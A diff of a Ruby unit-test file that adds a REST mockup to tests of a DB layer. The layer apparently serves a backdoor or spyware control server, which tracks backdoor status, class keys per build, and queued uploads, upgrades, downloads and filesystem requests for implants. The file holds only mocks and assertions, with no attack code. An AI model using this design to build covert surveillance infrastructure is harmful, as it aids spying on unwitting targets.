@@ -17,21 +17,25 @@ class Config
   include Singleton
   def initialize
     @global = {'DB_ADDRESS' => 'test',
-               'DB_PORT' => '0',
+               'DB_PORT' => 80,
                'DB_SIGN' => 'rcs-server.sig',
                'DB_CERT' => 'rcs-ca.pem'}
   end
 end
 
-# fake xmlrpc class used during the DB initialize
+# fake classes used during the DB initialize
 class DB_xmlrpc
+  def trace(a, b)
+  end
+end
+class DB_rest
   def trace(a, b)
   end
 end
 
 # this class is a mockup for the db layer
 # it will implement fake response to test the DB class
-class DB_mockup
+class DB_mockup_xmlrpc
   def initialize
     @@failure = false
   end
@@ -86,16 +90,32 @@ class DB_mockup
   end
 end
 
+class DB_mockup_rest
+  def initialize
+    @@failure = false
+  end
+
+  # used the change the behavior of the mockup methods
+  def self.failure=(value)
+    @@failure = value
+  end
+
+  # mockup methods
+  def login(user, pass); return (@@failure) ? false : true; end
+end
+
 class TestDB < Test::Unit::TestCase
 
   def setup
     # take the internal variable representing the db layer to be used
     # and mock it for the tests
-    DB.instance.instance_variable_set(:@db, DB_mockup.new)
+    DB.instance.instance_variable_set(:@db, DB_mockup_xmlrpc.new)
+    DB.instance.instance_variable_set(:@db_rest, DB_mockup_rest.new)
     # clear the cache
     DBCache.destroy!
     # every test begins with the db connected
-    DB_mockup.failure = false
+    DB_mockup_xmlrpc.failure = false
+    DB_mockup_rest.failure = false
     DB.connect!
     assert_true DB.connected?
   end
@@ -105,7 +125,7 @@ class TestDB < Test::Unit::TestCase
   end
 
   def test_connect
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     DB.connect!
     assert_false DB.connected?
   end
@@ -121,7 +141,7 @@ class TestDB < Test::Unit::TestCase
     assert_equal 'test-network-signature', DB.network_signature
     assert_equal Digest::MD5.digest('secret class key'), DB.class_key_of('BUILD001')
 
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     # this will fail to reach the db 
     assert_false DB.cache_init
     assert_false DB.connected?
@@ -142,7 +162,7 @@ class TestDB < Test::Unit::TestCase
     # not existing build from mockup
     assert_equal nil, DB.class_key_of('404')
 
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     # we have it in the cache
     assert_equal Digest::MD5.digest('secret class key'), DB.class_key_of('BUILD001')
     assert_false DB.connected?
@@ -153,7 +173,7 @@ class TestDB < Test::Unit::TestCase
   def test_status_of
     assert_equal [DB::ACTIVE_BACKDOOR, 1], DB.status_of('BUILD001', 'inst', 'type')
     # during the db failure, we must be able to continue
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     assert_equal [DB::UNKNOWN_BACKDOOR, 0], DB.status_of('BUILD001', 'inst', 'type')
     assert_false DB.connected?
     # now the layer is aware of the failure
@@ -164,7 +184,7 @@ class TestDB < Test::Unit::TestCase
     assert_true DB.new_conf?(1)
     assert_equal "this is the binary config", DB.new_conf(1)
 
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     assert_false DB.new_conf?(1)
     assert_false DB.connected?
     assert_equal nil, DB.new_conf(1)
@@ -183,7 +203,7 @@ class TestDB < Test::Unit::TestCase
     assert_equal "filename2", upl[:filename]
     assert_equal "file content 2", upl[:content]
 
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     assert_false DB.new_uploads?(1)
     assert_false DB.connected?
     upl, left = DB.new_uploads(1)
@@ -203,7 +223,7 @@ class TestDB < Test::Unit::TestCase
     assert_equal "upgrade2", upg[:filename]
     assert_equal "upgrade content 2", upg[:content]
 
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     assert_false DB.new_upgrade?(1)
     assert_false DB.connected?
     upg, left = DB.new_upgrade(1)
@@ -214,7 +234,7 @@ class TestDB < Test::Unit::TestCase
     assert_true DB.new_downloads?(1)
     assert_equal ["pattern"], DB.new_downloads(1)
 
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     assert_false DB.new_downloads?(1)
     assert_false DB.connected?
     assert_equal [], DB.new_downloads(1)
@@ -224,7 +244,7 @@ class TestDB < Test::Unit::TestCase
     assert_true DB.new_filesystems?(1)
     assert_equal [{:depth => 1, :path => "pattern"}], DB.new_filesystems(1)
 
-    DB_mockup.failure = true
+    DB_mockup_xmlrpc.failure = true
     assert_false DB.new_filesystems?(1)
     assert_false DB.connected?
     assert_equal [], DB.new_filesystems(1)
